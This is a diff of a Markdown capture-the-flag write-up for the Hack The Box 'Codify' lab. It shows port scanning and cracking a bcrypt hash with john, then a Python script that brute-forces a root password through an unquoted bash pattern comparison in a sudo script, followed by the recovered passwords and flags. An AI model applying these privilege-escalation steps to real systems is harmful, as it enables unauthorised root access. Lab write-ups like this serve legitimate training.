@@ -1,14 +1,7 @@
----
-title: Hack The Box - Codify
-date: 2024-08-08 13:33:37 +0200
-categories:
-  - HackTheBox
-tags:
-  - HTB
-comments: true
----
 
 HTB Codify Machine - https://www.hackthebox.com/machines/codify
+
+### 08-02-2024
 
 ### Scanning & Enumeration
 Scan and enumerate the machine for open ports and services running on it:
@@ -16,7 +9,7 @@ Scan and enumerate the machine for open ports and services running on it:
 nmap -sC -sV -v -oN nmap.log 10.10.11.239
 ```
 
-![](/assets/img/posts/Pasted image 20260820103802.png)
+![](/assets/img/posts/Pasted%20image%2020260820103802.png)
 
 I added the IP address to `/etc/hosts`:
 ```
@@ -28,7 +21,7 @@ I started off by browsing to `codify.htb` with Burp Suite enabled to intercept t
 - Editor - A simple page with a textarea to enter Node.js code and execute it.
 - Limitations - Notes restrictions like blocked access to certain modules like child_process and fs.
 
-![](/assets/img/posts/Pasted image 20260820104004.png)
+![](/assets/img/posts/Pasted%20image%2020260820104004.png)
 
 It says it is using the **vm2 library** to run JavaScript code in a sandbox environment.
 
@@ -66,7 +59,7 @@ try {
 console.log(vm.run(code));
 ```
 
-![](/assets/img/posts/Pasted image 20260820105615.png)
+![](/assets/img/posts/Pasted%20image%2020260820105615.png)
 
 Now, it's time to get a reverse shell.
 
@@ -103,7 +96,7 @@ console.log(vm.run(code));
 ```
 
 
-![](/assets/img/posts/Pasted image 20260820105222.png)
+![](/assets/img/posts/Pasted%20image%2020260820105222.png)
 
 Great! now we got a shell as svc user. We have a user home directory “Joshua” but we can’t move into that directory. So, it’s time to enumerate.
 
@@ -114,7 +107,7 @@ cd /var/www/contact
 ls -la tickets.db
 ```
 
-![](/assets/img/posts/Pasted image 20260820110117.png)
+![](/assets/img/posts/Pasted%20image%2020260820110117.png)
 
 It was a SQLite database file owned by the svc user, and this revealed a bcrypt password hash for the user `joshua: joshua$2a\$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2`
 
@@ -130,4 +123,74 @@ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
 This successfully cracked the hash, revealing the password.
 
-![](/assets/img/posts/Pasted image 20250817003554.png)
+![[Pasted image 20250817003554.png]]
+
+Results: `spongebob1`
+
+With joshua\'s credentials, I was able to switch users and escalate privileges using the `su` command:
+```
+su joshua
+Password: spongebob1
+cat /home/joshua/user.txt   # 63935fc1ef4d92aab9255b0eaae86490
+```
+
+Using SSH with this credentials
+```
+ssh joshua@10.10.11.239
+spongebob1
+```
+
+#### Privilege Escalation
+After becoming the joshua user, I continued searching for further privilege escalation opportunities.
+
+Checking sudo permissions revealed joshua could run this script as root:
+```
+joshua@codify:~$ sudo -l
+joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
+```
+
+![](/assets/img/posts/Pasted%20image%2020260820111254.png)
+
+Check the comparison it does for passwords, I think it is not a safe way to do that.
+
+After some research, I discovered that if the right side of == is not quoted, bash uses pattern matching instead of interpreting it as a string. If we give wildcard `*` it gives some weird output, it says Password confirmed, so we need to brute force the password.
+
+```
+joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
+Enter MySQL password for root: *
+```
+
+![](/assets/img/posts/Pasted%20image%2020260820111747.png)
+
+Here is the Python script I used to brute force and extract the password.
+```
+import string
+import subprocess
+all = list(string.ascii_letters + string.digits)
+password = ""
+found = False
+
+while not found:
+    for character in all:
+        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
+        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
+
+        if "Password confirmed!" in output:
+            password += character
+            print(password)
+            break
+    else:
+        found = True
+```
+
+![](/assets/img/posts/Pasted%20image%2020260820111856.png)
+
+Amazing, we got the root password.
+
+Let’s escalate our privilege.
+```
+joshua@codify:~$ su root
+Password: kljh12k3jhaskjh12kjh3
+root@codify:/home/joshua# cd /root
+cat root.txt                             # d90e86c3575996503b7e5ebfca41d75c
+```
